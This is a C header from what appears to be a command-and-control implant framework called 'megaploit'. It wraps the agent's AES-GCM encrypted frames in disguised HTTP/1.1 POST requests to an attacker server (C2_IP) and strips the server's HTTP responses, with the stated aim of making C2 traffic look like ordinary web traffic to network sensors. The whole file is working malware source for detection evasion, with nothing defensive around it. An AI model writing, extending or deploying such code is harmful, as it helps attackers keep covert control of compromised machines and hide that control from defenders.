/*
 * tls/http_profile.h  –  Optional HTTP/1.1 transport profile
 * ===========================================================
 * When C2_HTTP_PROFILE is defined at build time, this header is included
 * from inside tls_client.c and provides two inline helper functions that
 * wrap AES-GCM frames inside HTTP/1.1 request/response envelopes so the
 * C2 traffic looks like ordinary HTTPS web traffic to a network sensor.
 *
 * Wire format — outbound (agent → C2):
 *   POST /update HTTP/1.1\r\n
 *   Host: <C2_IP>\r\n
 *   Content-Type: application/octet-stream\r\n
 *   Content-Length: <len>\r\n
 *   Connection: keep-alive\r\n
 *   \r\n
 *   <raw [uint32 len][nonce][ciphertext+tag] frame bytes>
 *
 * Wire format — inbound (C2 → agent):
 *   HTTP/1.1 200 OK\r\n
 *   Content-Type: application/octet-stream\r\n
 *   Content-Length: <len>\r\n
 *   \r\n
 *   <raw [uint32 len][nonce][ciphertext+tag] frame bytes>
 *
 * Server-side counterpart:
 *   megaploit/server/listener.py must strip/add the HTTP wrapper when
 *   C2_HTTP_PROFILE is active.  See the Python transport layer for details.
 *
 * Included by: tls/tls_client.c (when C2_HTTP_PROFILE is defined).
 * NOT a standalone header — it references _tls_raw_send/_tls_raw_recv
 * which are static functions in tls_client.c.
 */

#pragma once
#ifndef HTTP_PROFILE_H
#define HTTP_PROFILE_H

#ifdef C2_HTTP_PROFILE

#ifndef C2_IP
#define C2_IP "host"   /* fallback; should always be set at build time */
#endif

/* ── _http_send_frame ─────────────────────────────────────────────────────
 *
 * Wrap the flat AES-GCM frame [hdr|cipher] in an HTTP POST and send it
 * through the SChannel channel.
 * Called from tls_send_msg() in place of the two _tls_raw_send calls.
 */
static BOOL _http_send_frame(PTLS_CONTEXT pCtx,
                              const BYTE *pData, DWORD cbData)
{
    /* Build HTTP request header */
    char hdr[320];
    int hdrLen = _snprintf(hdr, sizeof(hdr) - 1,
        "POST /update HTTP/1.1\r\n"
        "Host: " C2_IP "\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %lu\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        (unsigned long)cbData);
    if (hdrLen <= 0) return FALSE;

    /* Flat buffer: header + frame */
    DWORD  cbTotal = (DWORD)hdrLen + cbData;
    BYTE  *pBuf    = (BYTE *)malloc(cbTotal);
    if (!pBuf) return FALSE;
    memcpy(pBuf,           hdr,   (size_t)hdrLen);
    memcpy(pBuf + hdrLen,  pData, (size_t)cbData);

    /* _tls_raw_send is static in tls_client.c — accessible here because
     * this header is #include'd inside tls_client.c                      */
    BOOL ok = _tls_raw_send(pCtx, pBuf, cbTotal);
    free(pBuf);
    return ok;
}


/* ── _http_recv_frame_alloc ───────────────────────────────────────────────
 *
 * Read one complete HTTP response, strip headers, and return a heap-
 * allocated buffer containing exactly the body bytes.
 * *ppBody is set to the allocated buffer (caller must free()).
 * *pcbBody is set to the body byte count.
 *
 * Returns TRUE on success, FALSE on any recv failure or parse error.
 */
static BOOL _http_recv_frame_alloc(PTLS_CONTEXT pCtx,
                                    BYTE **ppBody, DWORD *pcbBody)
{
    *ppBody  = NULL;
    *pcbBody = 0;

    /* Read byte-by-byte until "\r\n\r\n" is found (header terminator).
     * HTTP headers are short; 512 bytes is always enough.                */
#define _HP_HDR_MAX 512
    char   rawHdr[_HP_HDR_MAX + 1];
    int    hPos  = 0;
    BOOL   found = FALSE;

    while (hPos < _HP_HDR_MAX) {
        BYTE b = 0;
        /* _tls_raw_recv reads exactly the requested byte count           */
        if (!_tls_raw_recv(pCtx, &b, 1)) return FALSE;
        rawHdr[hPos++] = (char)b;
        rawHdr[hPos]   = '\0';
        if (hPos >= 4 &&
            rawHdr[hPos-4] == '\r' && rawHdr[hPos-3] == '\n' &&
            rawHdr[hPos-2] == '\r' && rawHdr[hPos-1] == '\n') {
            found = TRUE;
            break;
        }
    }
    if (!found) return FALSE;

    /* Parse Content-Length */
    const char *clHdr = strstr(rawHdr, "Content-Length:");
    if (!clHdr) clHdr  = strstr(rawHdr, "content-length:");
    if (!clHdr) return FALSE;

    DWORD bodyLen = (DWORD)strtoul(clHdr + 15, NULL, 10);
    if (bodyLen == 0 || bodyLen > (DWORD)TLS_MAX_FRAME_SIZE) return FALSE;

    /* Allocate and read body */
    BYTE *pBody = (BYTE *)malloc(bodyLen);
    if (!pBody) return FALSE;

    if (!_tls_raw_recv(pCtx, pBody, bodyLen)) {
        free(pBody);
        return FALSE;
    }

    *ppBody  = pBody;
    *pcbBody = bodyLen;
    return TRUE;
#undef _HP_HDR_MAX
}

#endif /* C2_HTTP_PROFILE */
#endif /* HTTP_PROFILE_H */
